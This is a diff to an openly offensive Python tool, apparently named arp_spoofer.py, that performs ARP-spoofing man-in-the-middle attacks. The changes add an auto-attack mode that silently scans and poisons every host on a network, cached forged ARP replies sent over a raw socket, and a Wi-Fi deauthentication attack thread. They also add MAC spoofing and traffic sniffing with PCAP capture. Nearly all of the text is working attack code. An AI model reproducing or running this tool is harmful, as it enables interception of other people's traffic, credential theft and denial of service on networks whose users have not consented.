         self._stop = threading.Event()
         self._targets_lock = threading.Lock()
         self.sent = 0
@@ -2389,25 +2360,55 @@ class SpoofSession:
         self.last_mac_refresh = 0.0
         self.consecutive_gateway_failures = 0
         self.start_time = time.time()
-        self._target_failures: dict[str, int] = {}
+        self._target_failures: Dict[str, int] = {}
+        self.sock = None
+        self._packet_cache = []
+        self._cache_dirty = True
+
+    def _is_excluded_ip(self, ip: str, local_ip: str) -> bool:
+        if not ip or ip == self.gateway or ip == local_ip:
+            return True
+        if ip in self.whitelist:
+            return True
+        try:
+            net = ipaddress.ip_network(self.ip_range, strict=False)
+            if ip == str(net.network_address) or ip == str(net.broadcast_address):
+                return True
+        except ValueError:
+            pass
+        return False
 
     def setup_targets(self):
         local_ip = get_local_ip()
-        if self.args.all:
+        if self.args.target:
+            target_ip = self.args.target
+            if self._is_excluded_ip(target_ip, local_ip):
+                log_err("Invalid target or target is local/gateway/whitelisted.")
+                return False
+            target_mac = get_mac(target_ip)
+            if not target_mac:
+                log_err(f"Cannot resolve MAC for {target_ip}.")
+                return False
+            with self._targets_lock:
+                self.targets = [{"ip": target_ip, "mac": target_mac}]
+        elif self.args.all:
             log_info("Auto-Attack Mode: Scanning network silently...")
             devices = silent_scan(self.ip_range)
             with self._targets_lock:
                 self.targets = [
                     {"ip": d["ip"], "mac": d["mac"]}
                     for d in devices
-                    if d["ip"] != self.gateway and d["ip"] != local_ip
+                    if not self._is_excluded_ip(d["ip"], local_ip)
                 ]
         else:
             devices = visual_scan(self.ip_range)
             if not devices:
                 log_err("No devices found.")
                 return False
-            choice = input(f"\n{Fore.WHITE}[?] Select Target IP: ")
+            choice = input(f"\n{Fore.WHITE}[?] Select Target IP: ").strip()
+            if self._is_excluded_ip(choice, local_ip):
+                log_err("Invalid target or target is local/gateway/whitelisted.")
+                return False
             mac = next((d["mac"] for d in devices if d["ip"] == choice), None)
             if mac:
                 with self._targets_lock:
@@ -2416,6 +2417,7 @@ class SpoofSession:
                 log_err("Target not in list.")
                 return False
         log_ok(f"{len(self.targets)} target(s) loaded.")
+        self._cache_dirty = True
         return bool(self.targets)
 
     def refresh_target_macs(self):
@@ -2429,6 +2431,7 @@ class SpoofSession:
                 if new_mac and new_mac != t["mac"]:
                     log_info(f"MAC updated for {t['ip']}: {t['mac']} -> {new_mac}")
                     t["mac"] = new_mac
+                    self._cache_dirty = True
 
     def refresh_targets_if_needed(self):
         if not self.args.all:
@@ -2440,58 +2443,103 @@ class SpoofSession:
         log_info("Refreshing target list...")
         devices = silent_scan(self.ip_range)
         local_ip = get_local_ip()
-        new_targets = [
-            d for d in devices
-            if d["ip"] != self.gateway and d["ip"] != local_ip
-        ]
+        
         with self._targets_lock:
             known_ips = {t["ip"] for t in self.targets}
-            for t in new_targets:
-                if t["ip"] not in known_ips:
-                    self.targets.append({"ip": t["ip"], "mac": t["mac"]})
-                    log_ok(f"New target detected: {t['ip']} ({t['mac']})")
+            for d in devices:
+                if not self._is_excluded_ip(d["ip"], local_ip) and d["ip"] not in known_ips:
+                    self.targets.append({"ip": d["ip"], "mac": d["mac"]})
+                    log_ok(f"New target detected: {d['ip']} ({d['mac']})")
+                    self._cache_dirty = True
 
     def verify_gateway(self) -> bool:
         mac = get_mac(self.gateway)
         if mac:
             self.gateway_mac = mac
             self.consecutive_gateway_failures = 0
+            self._cache_dirty = True
             return True
         self.consecutive_gateway_failures += 1
         return False
 
-    def spoof_cycle(self):
+    def _build_packet_cache(self):
+        if not self.gateway_mac:
+            self._packet_cache = []
+            return
+            
+        local_ip = get_local_ip()
         with self._targets_lock:
             current_targets = list(self.targets)
-        if not self.gateway_mac or not current_targets:
-            return
+            
+        self._packet_cache = []
         for t in current_targets:
-            if not t.get("mac"):
-                t["mac"] = get_mac(t["ip"])
-                if not t["mac"]:
-                    continue
-            try:
-                spoof(t["ip"], t["mac"], self.gateway)
-                spoof(self.gateway, self.gateway_mac, t["ip"])
-                self.sent += 2
-                self._target_failures[t["ip"]] = 0
-            except Exception:
-                self._target_failures[t["ip"]] = self._target_failures.get(t["ip"], 0) + 1
-                if self._target_failures[t["ip"]] >= 5:
-                    new_mac = get_mac(t["ip"])
-                    if new_mac:
-                        t["mac"] = new_mac
-                        self._target_failures[t["ip"]] = 0
+            if t["ip"] == local_ip:
                 continue
+            if not t.get("mac"):
+                continue
+                
+            self._packet_cache.append(
+                scapy.Ether(dst=t["mac"]) / scapy.ARP(op=2, pdst=t["ip"], hwdst=t["mac"], psrc=self.gateway)
+            )
+            self._packet_cache.append(
+                scapy.Ether(dst=self.gateway_mac) / scapy.ARP(op=2, pdst=self.gateway, hwdst=self.gateway_mac, psrc=t["ip"])
+            )
+            
+        self._cache_dirty = False
+
+    def spoof_cycle(self):
+        if self._cache_dirty:
+            self._build_packet_cache()
+            
+        if not self._packet_cache or not self.sock:
+            return
+
+        try:
+            for pkt in self._packet_cache:
+                self.sock.send(pkt)
+                self.sent += 1
+        except Exception as exc:
+            log_warn(f"L2 socket send failed: {exc}. Reinitializing socket.")
+            try:
+                self.sock.close()
+            except Exception:
+                pass
+            try:
+                self.sock = scapy.L2socket(iface=conf.iface)
+            except Exception:
+                self.sock = None
+
+    def deauth_thread(self):
+        target_ip = self.args.deauth
+        target_mac = get_mac(target_ip)
+        if not target_mac:
+            log_err(f"Deauth: Cannot resolve MAC for {target_ip}. Aborting deauth.")
+            return
+        if not self.gateway_mac:
+            log_err("Deauth: Gateway MAC unknown. Aborting deauth.")
+            return
+            
+        log_info(f"Deauth attack active on {target_ip} ({target_mac}) via {self.gateway_mac}")
+        pkt = scapy.RadioTap() / scapy.Dot11(type=0, subtype=12, addr1=target_mac, addr2=self.gateway_mac, addr3=self.gateway_mac) / scapy.Dot11Deauth(reason=7)
+        
+        while not self._stop.is_set():
+            try:
+                scapy.sendp(pkt, count=20, inter=0.02, verbose=False)
+            except Exception:
+                pass
+            self._stop.wait(1)
 
     def watchdog_loop(self):
         while not self._stop.is_set():
-            time.sleep(CHECK_INTERVAL)
+            self._stop.wait(CHECK_INTERVAL)
+            if self._stop.is_set():
+                break
             try:
                 ctx = self.resilience.refresh_context()
                 if ctx.gateway and ctx.gateway != self.gateway:
                     log_warn(f"Gateway changed: {self.gateway} -> {ctx.gateway}")
                     self.gateway = ctx.gateway
+                    self._cache_dirty = True
                 if ctx.ip_range and ctx.ip_range != self.ip_range:
                     self.ip_range = ctx.ip_range
 
@@ -2502,6 +2550,7 @@ class SpoofSession:
                         ctx = self.resilience.refresh_context()
                         if ctx.gateway:
                             self.gateway = ctx.gateway
+                            self._cache_dirty = True
                         if ctx.ip_range:
                             self.ip_range = ctx.ip_range
                         self.verify_gateway()
@@ -2526,6 +2575,7 @@ class SpoofSession:
                 ctx = self.resilience.refresh_context()
                 if ctx.gateway:
                     self.gateway = ctx.gateway
+                    self._cache_dirty = True
                 if ctx.ip_range:
                     self.ip_range = ctx.ip_range
                 if not self.verify_gateway():
@@ -2533,28 +2583,63 @@ class SpoofSession:
             else:
                 sys.exit(1)
 
-        if self.args.sniff:
+        try:
+            self.sock = scapy.L2socket(iface=conf.iface)
+            log_ok(f"L2 raw socket opened on {conf.iface}")
+        except Exception as exc:
+            log_err(f"Failed to open L2 socket: {exc}. Falling back to standard sendp.")
+            self.sock = None
+
+        if self.args.sniff or self.args.pcap:
             log_info("Traffic Sniffer: Online")
             sniff_filter = "ip or arp"
-            sniff_thread = threading.Thread(
-                target=lambda: scapy.sniff(
-                    prn=process_packet,
-                    store=False,
-                    filter=sniff_filter,
-                    stop_filter=lambda _: self._stop.is_set(),
-                ),
-                daemon=True,
-            )
+            
+            def sniff_target():
+                pcap_writer = None
+                if self.args.pcap:
+                    try:
+                        pcap_writer = scapy.PcapWriter(self.args.pcap, append=False, sync=True)
+                        log_ok(f"Writing traffic to {self.args.pcap}")
+                    except Exception as exc:
+                        log_err(f"Failed to open PCAP file: {exc}")
+                        pcap_writer = None
+
+                def handle_packet(pkt):
+                    if pcap_writer:
+                        try:
+                            pcap_writer.write(pkt)
+                        except Exception:
+                            pass
+                    if self.args.sniff:
+                        process_packet(pkt)
+
+                while not self._stop.is_set():
+                    try:
+                        scapy.sniff(prn=handle_packet, store=False, filter=sniff_filter, timeout=1, stop_filter=lambda _: self._stop.is_set())
+                    except Exception:
+                        pass
+                
+                if pcap_writer:
+                    try:
+                        pcap_writer.close()
+                    except Exception:
+                        pass
+
+            sniff_thread = threading.Thread(target=sniff_target, daemon=True)
             sniff_thread.start()
         else:
             log_warn("Traffic Sniffer: Offline (Use -s to enable)")
+
+        if self.args.deauth:
+            deauth_t = threading.Thread(target=self.deauth_thread, daemon=True)
+            deauth_t.start()
 
         watchdog = threading.Thread(target=self.watchdog_loop, daemon=True)
         watchdog.start()
 
         safe_print(f"\n{Fore.RED}[!] BY LTX & Moka - ATTACK ACTIVE")
         try:
-            while True:
+            while not self._stop.is_set():
                 self.spoof_cycle()
                 status = "ONLINE" if self.resilience.has_internet() else "OFFLINE"
                 with self._targets_lock:
@@ -2564,14 +2649,15 @@ class SpoofSession:
                 mins, secs = divmod(rem, 60)
                 uptime_str = f"{hours:02d}:{mins:02d}:{secs:02d}"
                 safe_print(
-                    f"\r{Fore.WHITE}Packets: {Fore.GREEN}{self.sent} "
+                    f"\r\033[K{Fore.WHITE}Packets: {Fore.GREEN}{self.sent} "
                     f"{Fore.WHITE}| Targets: {Fore.GREEN}{target_count} "
                     f"{Fore.WHITE}| Internet: {Fore.GREEN if status == 'ONLINE' else Fore.RED}{status} "
                     f"{Fore.WHITE}| Uptime: {Fore.CYAN}{uptime_str} "
                     f"{Fore.WHITE}| Ctrl+C to stop",
                     end="",
+                    flush=True
                 )
-                time.sleep(SPOOF_INTERVAL)
+                self._stop.wait(self.args.interval)
         except KeyboardInterrupt:
             self._stop.set()
             self._restore()
@@ -2589,13 +2675,19 @@ class SpoofSession:
             log_ok("Network successfully restored. Exit.")
         except Exception:
             log_err("Error during restoration.")
+            
+        if self.sock:
+            try:
+                self.sock.close()
+            except Exception:
+                pass
 
 
-def resolve_network_args(args, selected: Optional[NetworkAdapter] = None) -> tuple[str, str]:
+def resolve_network_args(args, selected: Optional[NetworkAdapter] = None) -> Tuple[str, str]:
     if not args.ip_range or not args.gateway:
         log_err("Missing network range (-r) or gateway (-g).")
         sys.exit(1)
-    if args.ip_range == "UNKNOWN" or not re.match(r"\d+\.\d+\.\d+\.\d+", args.gateway):
+    if args.ip_range == "UNKNOWN" or not RE_IPV4.match(args.gateway):
         log_err("Invalid network configuration detected.")
         sys.exit(1)
     return args.ip_range, args.gateway
@@ -2654,77 +2746,96 @@ def init_session_logger(log_file: Optional[str]):
 
 def main():
     session = None
-    try:
-        args = get_arguments()
+    args = get_arguments()
 
-        if args.scan:
-            run_scan_mode(args)
-        if args.scan_wifi:
-            run_wifi_scan_mode(args)
+    if args.scan:
+        run_scan_mode(args)
+    if args.scan_wifi:
+        run_wifi_scan_mode(args)
 
-        print_banner()
+    print_banner()
 
-        if not check_admin_windows():
-            if os.name == "nt":
-                log_warn("Running without administrator rights - some features may not work.")
-                log_warn("Relaunch without --no-elevate to trigger the UAC prompt.")
-            else:
-                log_warn("Running without root privileges - some features may not work.")
-                log_warn("Relaunch without --no-elevate or use: sudo python3 arp_spoofer.py")
+    if not check_admin_windows():
+        if os.name == "nt":
+            log_warn("Running without administrator rights - some features may not work.")
+            log_warn("Relaunch without --no-elevate to trigger the UAC prompt.")
+        else:
+            log_warn("Running without root privileges - some features may not work.")
+            log_warn("Relaunch without --no-elevate or use: sudo python3 arp_spoofer.py")
 
-        init_session_logger(args.log_file)
+    init_session_logger(args.log_file)
 
-        selected = configure_network(args)
-        if selected and conf.iface:
-            log_info(f"Network interface: {conf.iface} ({selected.name})")
-        elif conf.iface:
-            log_info(f"Network interface: {conf.iface}")
+    selected = configure_network(args)
+    if selected and conf.iface:
+        log_info(f"Network interface: {conf.iface} ({selected.name})")
+    elif conf.iface:
+        log_info(f"Network interface: {conf.iface}")
 
-        args.ip_range, args.gateway = resolve_network_args(args, selected)
-        log_info(f"Network: {args.ip_range} | Gateway: {args.gateway}")
+    if args.spoof_mac and selected:
+        apply_spoofed_mac(selected.name)
 
-        enable_ip_forwarding()
+    args.ip_range, args.gateway = resolve_network_args(args, selected)
+    log_info(f"Network: {args.ip_range} | Gateway: {args.gateway}")
 
-        initial_ctx = NetworkContext(
-            ip_range=args.ip_range,
-            gateway=args.gateway,
-            interface_name=selected.name if selected else "",
-        )
-        resilience = NetworkResilience(initial_ctx)
-        resilience.capture_initial_wifi()
-        resilience.refresh_context()
+    enable_ip_forwarding()
 
-        if not args.no_recovery and not resilience.has_internet():
-            log_warn("No internet at startup - running recovery...")
-            resilience.recover_connectivity()
-            ctx = resilience.refresh_context()
-            if ctx.ip_range:
-                args.ip_range = ctx.ip_range
-            if ctx.gateway:
-                args.gateway = ctx.gateway
+    initial_ctx = NetworkContext(
+        ip_range=args.ip_range,
+        gateway=args.gateway,
+        interface_name=selected.name if selected else "",
+    )
+    resilience = NetworkResilience(initial_ctx)
+    resilience.capture_initial_wifi()
+    resilience.refresh_context()
 
-        session = SpoofSession(args, resilience)
-        if not session.setup_targets():
-            sys.exit(1)
-        session.run()
-        sys.exit(0)
-    except KeyboardInterrupt:
-        safe_print(f"\n\n{Fore.LIGHTCYAN_EX}[*] Stopped by user.")
-        if session is not None:
-            try:
-                session._stop.set()
-                session._restore()
-            except Exception:
-                pass
-        sys.exit(0)
+    if not args.no_recovery and not resilience.has_internet():
+        log_warn("No internet at startup - running recovery...")
+        resilience.recover_connectivity()
+        ctx = resilience.refresh_context()
+        if ctx.ip_range:
+            args.ip_range = ctx.ip_range
+        if ctx.gateway:
+            args.gateway = ctx.gateway
+
+    session = SpoofSession(args, resilience)
+    if not session.setup_targets():
+        sys.exit(1)
+    session.run()
+    sys.exit(0)
 
 
 if __name__ == "__main__":
     request_admin_elevation()
-    try:
-        main()
-    except KeyboardInterrupt:
-        safe_print(f"\n\n{Fore.LIGHTCYAN_EX}[*] Stopped by user.")
-        sys.exit(0)
-
-# Made by LTX & Moka
+    
+    while True:
+        try:
+            main()
+            break
+        except KeyboardInterrupt:
+            safe_print(f"\n\n{Fore.LIGHTCYAN_EX}[*] Stopped by user.")
+            sys.exit(0)
+        except SystemExit as exc:
+            if exc.code == 0 or exc.code is None:
+                break
+            safe_print(f"\n\n{Fore.RED}[!] Script exited with code {exc.code}.")
+        except Exception as e:
+            safe_print(f"\n\n{Fore.RED}[!!!] UNEXPECTED FATAL ERROR: {e}")
+            safe_print(f"{Fore.YELLOW}{traceback.format_exc()}")
+            if _session_logger:
+                _session_logger.write("FATAL", f"{e}\n{traceback.format_exc()}")
+        
+        while True:
+            try:
+                choice = input(f"{Fore.YELLOW}[?] Do you want to restart the script? (y/N): ").strip().lower()
+            except EOFError:
+                choice = 'n'
+                
+            if choice in ('y', 'yes'):
+                safe_print(f"{Fore.CYAN}[*] Restarting script...")
+                time.sleep(1)
+                break
+            elif choice in ('n', 'no', ''):
+                safe_print(f"{Fore.RED}[*] Closing script.")
+                sys.exit(1)
+            else:
+                safe_print(f"{Fore.RED}[!] Invalid choice. Answer Y or N.")
